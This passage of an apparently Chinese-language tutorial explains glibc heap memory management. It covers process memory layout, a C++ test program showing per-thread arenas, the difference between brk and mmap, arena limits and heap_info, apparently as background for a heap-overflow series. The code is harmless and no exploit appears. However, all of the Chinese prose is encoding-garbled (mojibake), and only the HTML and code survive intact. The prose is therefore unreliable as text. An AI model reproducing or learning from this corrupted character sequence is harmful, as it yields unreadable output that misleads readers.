src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/2.png" alt="img"></p><p>è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜åˆ†å¸ƒç¤ºæ„å›¾(32ä½ç³»ç»Ÿçš„è¿›ç¨‹è™šæ‹Ÿå†…å­˜åˆ†å¸ƒ)ï¼š</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/3.png" alt="img"></p><p>ä»»ä½•åº”ç”¨éƒ½å¯ä»¥è°ƒç”¨ Linux çš„ <code>mmap</code> ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ–è€… Windows çš„ <code>CreateFileMapping</code>/<code>MapViewOfFile</code>ï¼Œå‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜æ˜ å°„ã€‚å†…å­˜æ˜ å°„æ˜¯ä¸€ä¸ªå¾ˆæ–¹ä¾¿ã€é«˜æ•ˆçš„åšæ–‡ä»¶ IO çš„æ–¹å¼, æ‰€ä»¥ä¸€èˆ¬ç”¨æ¥åŠ è½½åŠ¨æ€é“¾æ¥åº“ï¼ˆdynamic librariesï¼‰ï¼Œä¹Ÿå¯ä»¥åˆ›å»ºä¸€å—åŒ¿åçš„æ˜ å°„å†…å­˜ï¼Œä¸å¯¹åº”ä»»ä½•æ–‡ä»¶ï¼Œåœ¨ç¨‹åºä¸­ä½¿ç”¨ã€‚</p><h2 id="å †å†…å­˜åˆ†é…å®éªŒ"><a href="#å †å†…å­˜åˆ†é…å®éªŒ" class="headerlink" title="å †å†…å­˜åˆ†é…å®éªŒ"></a>å †å†…å­˜åˆ†é…å®éªŒ</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test_malloc.cpp</span></span><br><span class="line"><span class="comment">//clang++ -std=c++11 test_malloc.cpp -lpthread</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">ThreadFunc</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">pthread_t</span> t1;</span><br><span class="line">        <span class="keyword">void</span>* s;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="keyword">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, ThreadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread creation error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = pthread_join(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread join error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸»çº¿ç¨‹-malloc-ä¹‹å‰"><a href="#ä¸»çº¿ç¨‹-malloc-ä¹‹å‰" class="headerlink" title="ä¸»çº¿ç¨‹ malloc ä¹‹å‰"></a>ä¸»çº¿ç¨‹ malloc ä¹‹å‰</h3><p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/4.png" alt="image-20210505225640027"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æœ¬æœºä¸Šï¼ˆUbuntu16.04ï¼Œx64ï¼‰ï¼Œåœ¨ä¸»çº¿ç¨‹è°ƒç”¨ <code>malloc</code> ä¹‹å‰ï¼Œå°±å·²ç»ç»™ä¸»çº¿ç¨‹åˆ†é…äº†ä¸€å—å †å†…å­˜ï¼Œè¿™å—<strong>é»˜è®¤å¤§å°çš„å†…å­˜æ˜¯ 200 KB</strong>ã€‚</p><p>å †åŒºå†…å­˜ä½ç½®æ˜¯ç´§æ¥ç€æ•°æ®æ®µçš„ï¼Œå¹¶ä¸”<strong>offset</strong>çš„å€¼ä¸º<strong>00000000</strong>ï¼Œè¯´æ˜è¿™ä¸ªç³»ç»Ÿæ˜¯é€šè¿‡ <code>brk</code> è¿›è¡Œå†…å­˜åˆ†é…çš„ã€‚</p><h3 id="ä¸»çº¿ç¨‹-malloc-ä¹‹å"><a href="#ä¸»çº¿ç¨‹-malloc-ä¹‹å" class="headerlink" title="ä¸»çº¿ç¨‹ malloc ä¹‹å"></a>ä¸»çº¿ç¨‹ malloc ä¹‹å</h3><p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/5.png" alt="image-20210505231259039"></p><p>åœ¨ä¸»çº¿ç¨‹ä¸­è°ƒç”¨ <code>malloc</code> ä¹‹åï¼Œå‘ç° <strong>å †çš„å¤§å°ä»ç„¶æ˜¯ 200K</strong>ï¼Œå› æ­¤ <code>malloc</code> å¹¶æ²¡æœ‰å¼•èµ·å †åŒºæ€»å®¹é‡çš„è‡ªå¢é•¿ã€‚</p><div class="note info modern"><p>ä½œè€…åŸæ–‡ä¸­æœ‰ä¸€ç§è§£é‡Šï¼ˆ32ä½ï¼‰ï¼šè¿˜å¯ä»¥çœ‹å‡ºè™½ç„¶æˆ‘ä»¬åªç”³è¯·äº†1000bytesçš„æ•°æ®ï¼Œä½†æ˜¯ç³»ç»Ÿå´åˆ†é…äº†132KBå¤§å°çš„å †ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼ŸåŸæ¥è¿™132KBçš„å †ç©ºé—´å«åš<strong>arena</strong>ï¼Œæ­¤æ—¶å› ä¸ºæ˜¯ä¸»çº¿ç¨‹åˆ†é…çš„ï¼Œæ‰€ä»¥å«åš<strong>main arena</strong>ï¼ˆæ¯ä¸ª<strong>arena</strong>ä¸­å«æœ‰å¤šä¸ª<strong>chunk</strong>ï¼Œè¿™äº›<strong>chunk</strong>ä»¥é“¾è¡¨çš„å½¢å¼åŠ ä»¥ç»„ç»‡)ã€‚ç”±äº132KBæ¯”1000byteså¤§å¾ˆå¤šï¼Œæ‰€ä»¥ä¸»çº¿ç¨‹åç»­å†ç”³è¯·å †ç©ºé—´çš„è¯ï¼Œå°±ä¼šå…ˆä»è¿™132KBçš„å‰©ä½™éƒ¨åˆ†ä¸­ç”³è¯·ï¼Œç›´åˆ°ç”¨å®Œæˆ–ä¸å¤Ÿç”¨çš„æ—¶å€™ï¼Œå†é€šè¿‡å¢åŠ <strong>program break location</strong>çš„æ–¹å¼æ¥å¢åŠ <strong>main arena</strong>çš„å¤§å°ã€‚åŒç†ï¼Œå½“<strong>main arena</strong>ä¸­æœ‰è¿‡å¤šç©ºé—²å†…å­˜çš„æ—¶å€™ï¼Œä¹Ÿä¼šé€šè¿‡å‡å°<strong>program break location</strong>çš„æ–¹å¼æ¥ç¼©å°<strong>main arena</strong>çš„å¤§å°ã€‚</p></div><h3 id="ä¸»çº¿ç¨‹-free-ä¹‹å"><a href="#ä¸»çº¿ç¨‹-free-ä¹‹å" class="headerlink" title="ä¸»çº¿ç¨‹ free ä¹‹å"></a>ä¸»çº¿ç¨‹ free ä¹‹å</h3><p>ä¸»çº¿ç¨‹è°ƒç”¨ <code>free</code> ä¹‹åï¼Œå †å†…å­˜åˆ†å¸ƒæœªå‘ç”Ÿæ”¹å˜</p><div class="note info modern"><p>åŸæ–‡ä¹Ÿç»™å‡ºäº†è§£é‡Šï¼ˆ32ä½ï¼‰ï¼šåœ¨ä¸»çº¿ç¨‹è°ƒç”¨<code>free</code>ä¹‹åï¼Œä»å†…å­˜å¸ƒå±€å¯ä»¥çœ‹å‡ºç¨‹åºçš„å †ç©ºé—´å¹¶æ²¡æœ‰è¢«é‡Šæ”¾æ‰ï¼Œå› ä¸ºè°ƒç”¨<code>free</code>å‡½æ•°é‡Šæ”¾å·²ç»åˆ†é…äº†çš„ç©ºé—´å¹¶éç›´æ¥â€œè¿”è¿˜â€ç»™ç³»ç»Ÿï¼Œè€Œæ˜¯ç”±<code>glibc</code>çš„<code>malloc</code>åº“å‡½æ•°åŠ ä»¥ç®¡ç†ã€‚å®ƒä¼šå°†é‡Šæ”¾çš„<strong>chunk</strong>ï¼ˆç§°ä¸º<strong>free chunk</strong>ï¼‰æ·»åŠ åˆ° <strong>main arena</strong> çš„ <strong>bin</strong>ï¼ˆè¿™æ˜¯ä¸€ç§ç”¨äºå­˜å‚¨åŒç±»å‹<strong>free chunk</strong> çš„åŒé“¾è¡¨æ•°æ®ç»“æ„ï¼Œåé¢ä¼šåŠ ä»¥è¯¦ç»†ä»‹ç»ï¼‰ä¸­ã€‚åœ¨è¿™é‡Œï¼Œè®°å½•ç©ºé—²ç©ºé—´çš„ <strong>free list</strong> æ•°æ®ç»“æ„ç§°ä¹‹ä¸º <strong>bins</strong>ã€‚ä¹‹åå½“ç”¨æˆ·å†æ¬¡è°ƒç”¨ <code>malloc</code> ç”³è¯·å †ç©ºé—´çš„æ—¶å€™ï¼Œ<code>glibc</code>çš„ <code>malloc</code> ä¼šå…ˆå°è¯•ä» <strong>bin</strong> ä¸­æ‰¾åˆ°ä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„ <strong>chunk</strong> ï¼Œå¦‚æœæ²¡æœ‰æ‰ä¼šå‘æ“ä½œç³»ç»Ÿç”³è¯·æ–°çš„å †ç©ºé—´ã€‚</p></div><h3 id="å­çº¿ç¨‹-malloc-ä¹‹å‰"><a href="#å­çº¿ç¨‹-malloc-ä¹‹å‰" class="headerlink" title="å­çº¿ç¨‹ malloc ä¹‹å‰"></a>å­çº¿ç¨‹ malloc ä¹‹å‰</h3><p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/6.png" alt="image-20210506110331027"></p><p>çº¢è‰²æ¡†è¿™ä¸€éƒ¨åˆ†åœ°å€å¯ä»¥çœ‹å‡ºï¼Œ<strong>åœ¨å­çº¿ç¨‹ <code>malloc</code> ä¹‹å‰ï¼Œå·²ç»åˆ›å»ºäº†å­çº¿ç¨‹çš„æ ˆï¼Œæˆ–è€…è¯´å­çº¿ç¨‹åˆ›å»ºæ—¶å°±åœ¨å†…å­˜æ˜ å°„åŒºä¸Šåˆ›å»ºäº†è¯¥çº¿ç¨‹çš„æ ˆç©ºé—´ï¼Œå…¶é»˜è®¤å¤§å°æ˜¯ 8MB</strong>ã€‚</p><div class="note info modern"><p><strong>Linux å­çº¿ç¨‹æ˜¯ç”± mmap åˆ›å»ºçš„ï¼Œæ‰€ä»¥å…¶æ ˆæ˜¯ä½äºå†…å­˜æ˜ å°„åŒºåŒºåŸŸ</strong></p></div><h3 id="å­çº¿ç¨‹-malloc-ä¹‹å"><a href="#å­çº¿ç¨‹-malloc-ä¹‹å" class="headerlink" title="å­çº¿ç¨‹ malloc ä¹‹å"></a>å­çº¿ç¨‹ malloc ä¹‹å</h3><p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/7.png" alt="image-20210506135215497"></p><p>åœ¨ <code>malloc</code> ä¹‹åï¼Œä¸ºå­çº¿ç¨‹åˆ†é…äº†å †åŒºï¼Œè¿™ä¸ªå¤§å°æ˜¯ 132Kï¼Œå¹¶ä¸”åŒæ ·æ˜¯ä½äºå†…å­˜æ˜ å°„åŒºï¼Œè¿™éƒ¨åˆ†åŒºåŸŸå°±æ˜¯ thread1 çš„å †ç©ºé—´ï¼Œå³ thread1 çš„ <strong>arena</strong>ã€‚åŒæ—¶è¿˜è¦æ³¨æ„ï¼Œå­çº¿ç¨‹åˆ†é…çš„ç©ºé—´æ˜¯å†…å­˜æ˜ å°„åŒºå‘ä¸‹å¢é•¿çš„ï¼Œä¹Ÿå°±æ˜¯å‘å †åŒºå¢é•¿ã€‚</p><p>æ‰€ä»¥å¯ä»¥ç¡®å®šçš„æ˜¯ï¼Œ<strong>å­çº¿ç¨‹çš„å †æ ˆéƒ½æ˜¯åˆ†é…åœ¨å†…å­˜æ˜ å°„åŒºå’Œå †åŒºä¹‹é—´çš„åŒºåŸŸ</strong>ï¼ˆä¹Ÿå¯ä»¥ç†è§£ä¸ºå°±æ˜¯åˆ†é…åœ¨å†…å­˜æ˜ å°„åŒºï¼Œå› ä¸ºå†…å­˜æ˜ å°„åŒºå’Œå †åŒºéƒ½æ˜¯åŠ¨æ€å¢é•¿çš„ï¼Œå†…å­˜æ˜ å°„åŒºå‘ä¸‹å¢é•¿ï¼Œå †åŒºå‘ä¸Šå¢é•¿ï¼‰ã€‚ä»è™šæ‹Ÿå†…å­˜çš„åˆ†å¸ƒå›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ 3GB çš„ç”¨æˆ·è¿›ç¨‹ç©ºé—´ä¸­ï¼Œåœ°å€æœ€é«˜å¤„çš„æ ˆæ‰€å ç”¨çš„æ¯”è¾ƒå°‘ï¼ˆä¸»çº¿ç¨‹çš„æ ˆä¸€èˆ¬æ˜¯ 16MB æˆ–è€… 8MBï¼‰ï¼Œç„¶åå†…å­˜æ˜ å°„åŒºä¹Ÿä¸å¤§ï¼Œè€Œåˆå§‹åŒ–çš„å †åŒºä¹Ÿå¾ˆå°ã€‚æ‰€ä»¥å†…å­˜æ˜ å°„åŒºå’Œå †ä¹‹é—´çš„åŒºåŸŸæ˜¯éå¸¸å¤§çš„ã€‚</p><h3 id="å­çº¿ç¨‹-free-ä¹‹å"><a href="#å­çº¿ç¨‹-free-ä¹‹å" class="headerlink" title="å­çº¿ç¨‹ free ä¹‹å"></a>å­çº¿ç¨‹ free ä¹‹å</h3><p>åŒä¸»çº¿ç¨‹ç±»ä¼¼ï¼Œå¹¶æ²¡æœ‰ç«‹å³å›æ”¶ã€‚</p><h2 id="brkå’Œmmapçš„åŒºåˆ«"><a href="#brkå’Œmmapçš„åŒºåˆ«" class="headerlink" title="brkå’Œmmapçš„åŒºåˆ«"></a>brkå’Œmmapçš„åŒºåˆ«</h2><p>ä»æ“ä½œç³»ç»Ÿè§’åº¦æ¥çœ‹ï¼Œè¿›ç¨‹åˆ†é…å†…å­˜æœ‰ä¸¤ç§æ–¹å¼ï¼Œåˆ†åˆ«ç”±ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨å®Œæˆï¼šbrkå’Œmmapï¼ˆä¸è€ƒè™‘å…±äº«å†…å­˜ï¼‰ã€‚</p><ul><li><p>brkæ˜¯å°†æ•°æ®æ®µ(.data)çš„æœ€é«˜åœ°å€æŒ‡é’ˆ_edataå¾€é«˜åœ°å€æ¨ï¼›</p></li><li><p>mmapæ˜¯åœ¨è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼ˆå †å’Œæ ˆä¸­é—´ï¼Œç§°ä¸º<strong>æ–‡ä»¶æ˜ å°„åŒºåŸŸ</strong>çš„åœ°æ–¹ï¼‰æ‰¾ä¸€å—ç©ºé—²çš„è™šæ‹Ÿå†…å­˜ã€‚</p></li></ul><p>è¿™ä¸¤ç§æ–¹å¼åˆ†é…çš„éƒ½æ˜¯<strong>è™šæ‹Ÿå†…å­˜</strong>ï¼Œæ²¡æœ‰åˆ†é…ç‰©ç†å†…å­˜ã€‚åœ¨ç¬¬ä¸€æ¬¡è®¿é—®å·²åˆ†é…çš„è™šæ‹Ÿåœ°å€ç©ºé—´çš„æ—¶å€™ï¼Œå‘ç”Ÿç¼ºé¡µä¸­æ–­ï¼Œæ“ä½œç³»ç»Ÿè´Ÿè´£åˆ†é…ç‰©ç†å†…å­˜ï¼Œç„¶åå»ºç«‹è™šæ‹Ÿå†…å­˜å’Œç‰©ç†å†…å­˜ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚</p><p>åœ¨æ ‡å‡†Cåº“ä¸­ï¼Œæä¾›äº†malloc/freeå‡½æ•°åˆ†é…é‡Šæ”¾å†…å­˜ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°åº•å±‚æ˜¯ç”±brkï¼Œmmapï¼Œmunmapè¿™äº›ç³»ç»Ÿè°ƒç”¨å®ç°çš„ã€‚</p><h2 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h2><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p><strong>arena</strong>åŸæœ¬çš„ç¿»è¯‘æ˜¯ç«æŠ€åœºï¼Œè¿™ä¸ªè¯éå¸¸å·§å¦™çš„è¡¨ç°äº†å †ä¸­å†…å­˜çš„ç®¡ç†çš„æ€è·¯ã€‚å‰æ–‡æåˆ°ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„<strong>arena</strong>ç”¨äºå †å†…å­˜çš„åˆ†é…ï¼Œè¿™ä¸ªåŒºåŸŸæ˜¯è°ƒç”¨<code>malloc</code>çš„æ—¶å€™ä»æ“ä½œç³»ç»Ÿè·å¾—çš„ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ¯”å®é™…<code>malloc</code>è¦å¤§ä¸€äº›ï¼Œå½“ä¸‹æ¬¡å†æ¬¡è°ƒç”¨<code>malloc</code>ï¼Œå¯ä»¥ç›´æ¥ä»<strong>arena</strong>ä¸­è¿›è¡Œå †å†…å­˜åˆ†é…ã€‚</p><blockquote><p><strong>arena</strong>åˆ†ä¸º<strong>thread arena</strong>ï¼ˆå¯ä»¥åŒ…å«å¤šä¸ª <strong>heap</strong>ï¼‰å’Œ<strong>main arena</strong>ï¼ˆåªåŒ…å«ä¸€ä¸ªå¯ä»¥è‡ªå¢é•¿çš„ <strong>heap</strong>ï¼‰ï¼Œæ¯ä¸ª<strong>heap</strong> è¢«åˆ†ä¸ºå¤šä¸ª <strong>chunk</strong></p></blockquote><h3 id="arena-æ•°é‡"><a href="#arena-æ•°é‡" class="headerlink" title="arena æ•°é‡"></a>arena æ•°é‡</h3><p>å¯¹äºä¸åŒç³»ç»Ÿï¼Œarena æ•°é‡çš„<a href="https://github.com/lattera/glibc/blob/master/malloc/arena.c#L888">çº¦æŸ</a>å¦‚ä¸‹</p><table><thead><tr><th align="center">systems</th><th align="center">number of arena</th></tr></thead><tbody><tr><td align="center">32bits</td><td align="center">2 x number of cpu cores + 1</td></tr><tr><td align="center">64bits</td><td align="center">8 x number of cpu cores + 1</td></tr></tbody></table><h3 id="arena-ç®¡ç†"><a href="#arena-ç®¡ç†" class="headerlink" title="arena ç®¡ç†"></a>arena ç®¡ç†</h3><p>å‡è®¾æœ‰å¦‚ä¸‹æƒ…æ™¯ï¼šä¸€å°åªå«æœ‰ä¸€ä¸ªå¤„ç†å™¨æ ¸å¿ƒçš„æœºå™¨å®‰è£…æœ‰ 32 ä½æ“ä½œç³»ç»Ÿï¼Œå…¶ä¸Šè¿è¡Œäº†ä¸€ä¸ªå¤šçº¿ç¨‹åº”ç”¨ç¨‹åºï¼Œå…±å«æœ‰ 4 ä¸ªçº¿ç¨‹â€”â€”ä¸»çº¿ç¨‹å’Œä¸‰ä¸ªå­çº¿ç¨‹ã€‚æ˜¾ç„¶çº¿ç¨‹ä¸ªæ•°å¤§äºç³»ç»Ÿèƒ½ç»´æŠ¤çš„æœ€å¤§ <strong>arena</strong> ä¸ªæ•°ï¼ˆ2 x æ ¸å¿ƒæ•° + 1= 3ï¼‰ï¼Œé‚£ä¹ˆæ­¤æ—¶ <code>glibc</code> çš„ <code>malloc</code> å°±éœ€è¦ç¡®ä¿è¿™ 4 ä¸ªçº¿ç¨‹èƒ½å¤Ÿæ­£ç¡®åœ°å…±äº«è¿™ 3 ä¸ª <strong>arena</strong>ï¼Œé‚£ä¹ˆå®ƒæ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿ</p><p>å½“ä¸»çº¿ç¨‹é¦–æ¬¡è°ƒç”¨ <code>malloc</code> çš„æ—¶å€™ä¼šç›´æ¥ä¸ºå®ƒåˆ†é…ä¸€ä¸ª <strong>main arena</strong>ï¼Œè€Œä¸éœ€è¦ä»»ä½•é™„åŠ æ¡ä»¶ã€‚</p><p>å½“å­çº¿ç¨‹ 1 å’Œå­çº¿ç¨‹ 2 é¦–æ¬¡è°ƒç”¨ <code>malloc</code> çš„æ—¶å€™ï¼Œ<code>glibc</code> å®ç°çš„ <code>malloc</code> ä¼šåˆ†åˆ«ä¸ºæ¯ä¸ªå­çº¿ç¨‹åˆ›å»ºä¸€ä¸ªæ–°çš„ <strong>thread arena</strong>ã€‚æ­¤æ—¶ï¼Œå„ä¸ªçº¿ç¨‹ä¸ <strong>arena</strong> æ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚ä½†æ˜¯ï¼Œå½“ç”¨æˆ·çº¿ç¨‹ 3 è°ƒç”¨ <code>malloc</code> çš„æ—¶å€™å°±å‡ºç°é—®é¢˜äº†ã€‚å› ä¸ºæ­¤æ—¶ <code>glibc</code> çš„ <code>malloc</code> èƒ½ç»´æŠ¤çš„ <strong>arena</strong> ä¸ªæ•°å·²ç»è¾¾åˆ°ä¸Šé™ï¼Œæ— æ³•å†ä¸ºå­çº¿ç¨‹ 3 åˆ†é…æ–°çš„ <strong>arena</strong> äº†ï¼Œé‚£ä¹ˆå°±éœ€è¦é‡å¤ä½¿ç”¨å·²ç»åˆ†é…å¥½çš„ 3 ä¸ª <strong>arena</strong> ä¸­çš„ä¸€ä¸ªï¼ˆ<strong>main arena</strong>, <strong>arena1</strong> æˆ–è€… <strong>arena2</strong>ï¼‰ã€‚é‚£ä¹ˆè¯¥é€‰æ‹©å“ªä¸ª <strong>arena</strong> è¿›è¡Œé‡å¤åˆ©ç”¨å‘¢ï¼Ÿ<code>glibc</code> çš„ <code>malloc</code> éµå¾ªä»¥ä¸‹è§„åˆ™ï¼š</p><ol><li>é¦–å…ˆå¾ªç¯éå†æ‰€æœ‰å¯ç”¨çš„ <strong>arena</strong>ï¼Œåœ¨éå†çš„è¿‡ç¨‹ä¸­ï¼Œå®ƒä¼šå°è¯•åŠ é”è¯¥ <strong>arena</strong>ã€‚å¦‚æœæˆåŠŸåŠ é”ï¼ˆè¯¥ <strong>arena</strong> å½“å‰å¯¹åº”çš„çº¿ç¨‹å¹¶æœªä½¿ç”¨å †å†…å­˜åˆ™è¡¨ç¤ºå¯åŠ é”ï¼‰ï¼Œæ¯”å¦‚å°† <strong>main arena</strong> æˆåŠŸé”ä½ï¼Œé‚£ä¹ˆå°±å°† <strong>main arena</strong> è¿”å›ç»™ç”¨æˆ·ï¼Œå³è¡¨ç¤ºè¯¥ <strong>arena</strong> è¢«å­çº¿ç¨‹ 3 å…±äº«ä½¿ç”¨ã€‚</li><li>å¦‚æœæ²¡èƒ½æ‰¾åˆ°å¯ç”¨çš„ <strong>arena</strong>ï¼Œé‚£ä¹ˆå°±å°†å­çº¿ç¨‹ 3 çš„ <code>malloc</code> æ“ä½œé˜»å¡ï¼Œç›´åˆ°æœ‰å¯ç”¨çš„ <strong>arena</strong> ä¸ºæ­¢ã€‚</li><li>å¦‚æœå­çº¿ç¨‹ 3 å†æ¬¡è°ƒç”¨ <code>malloc</code> çš„è¯ï¼Œ<code>glibc</code> çš„ <code>malloc</code> å°±ä¼šå…ˆå°è¯•ä½¿ç”¨æœ€è¿‘è®¿é—®çš„ <strong>arena</strong>ï¼ˆæ­¤æ—¶ä¸º <strong>main arena</strong>ï¼‰ã€‚å¦‚æœæ­¤æ—¶ <strong>main arena</strong> å¯ç”¨çš„è¯ï¼Œå°±ç›´æ¥ä½¿ç”¨ï¼Œå¦åˆ™å°±å°†å­çº¿ç¨‹ 3 é˜»å¡ï¼Œç›´åˆ° <strong>main arena</strong> å†æ¬¡å¯ç”¨ä¸ºæ­¢ã€‚</li></ol><h2 id="å †çš„æ•°æ®ç»“æ„"><a href="#å †çš„æ•°æ®ç»“æ„" class="headerlink" title="å †çš„æ•°æ®ç»“æ„"></a>å †çš„æ•°æ®ç»“æ„</h2><p>åœ¨ <code>glibc</code> çš„ <code>malloc</code> ä¸­é’ˆå¯¹å †ç®¡ç†ï¼Œä¸»è¦æ¶‰åŠåˆ°ä»¥ä¸‹ 3 ç§æ•°æ®ç»“æ„</p><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>æˆ‘ä»¬æŠŠä»æ“ä½œç³»ç»Ÿç”³è¯·çš„ä¸€å—å†…å­˜ç§°ä¸ºä¸€ä¸ª <strong>heap</strong>ï¼Œè¿™ä¸ª <strong>heap</strong> çš„ä¿¡æ¯å°±æ˜¯ç”¨ <code>heap_info</code> è¡¨ç¤ºï¼Œä¹Ÿç§°ä¸º <strong>heap header</strong>ï¼Œå› ä¸ºä¸€ä¸ª <strong>thread arena</strong>ï¼ˆæ³¨æ„ï¼šä¸åŒ…å«ä¸»çº¿ç¨‹ï¼‰å¯ä»¥åŒ…å«å¤šä¸ª <strong>heap</strong>ï¼Œæ‰€ä»¥ä¸ºäº†ä¾¿äºç®¡ç†ï¼Œå°±ç»™æ¯ä¸ª <strong>heap</strong> ç”¨ä¸€ä¸ª <code>heap_info</code> è¡¨ç¤ºã€‚</p><blockquote><p>æ­¤å¤„çš„ <strong>heap</strong> å¹¶éå¹¿ä¹‰ä¸Šçš„è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ç©ºé—´ä¸­çš„å †ï¼Œè€Œæ˜¯å­çº¿ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨ <code>mmap</code> ä»æ“ä½œç³»ç»Ÿç”³è¯·çš„ä¸€å—å†…å­˜ç©ºé—´ï¼Œåé¢ <strong>heap</strong> ä¸åšå£°æ˜ï¼Œå‡æ˜¯è¿™ä¸ªæ„æ€ã€‚åŒæ—¶æˆ‘ä»¬æŠŠä¸»çº¿ç¨‹çš„ <strong>main arena</strong> çš„é‚£ä¸ªåŒºåŸŸä¹Ÿæˆä¸º <strong>heap</strong>ï¼Œè¿™ç§ç§°å‘¼ä¹Ÿæ˜¯å¯¹çš„ï¼ŒäºŒè€…åŠŸèƒ½ç›¸åŒï¼Œåªä¸è¿‡ä½ç½®ä¸åŒï¼Œä½†æ˜¯ <strong>main arena</strong> ä¸­åªåŒ…å«ä¸€ä¸ªå¯ä»¥è‡ªå¢é•¿çš„ <strong>heap</strong>ã€‚</p></blockquote><p>é‚£ä¹ˆåœ¨ä»€ä¹ˆæƒ…å†µä¸‹ä¸€ä¸ª <strong>thread arena</strong> 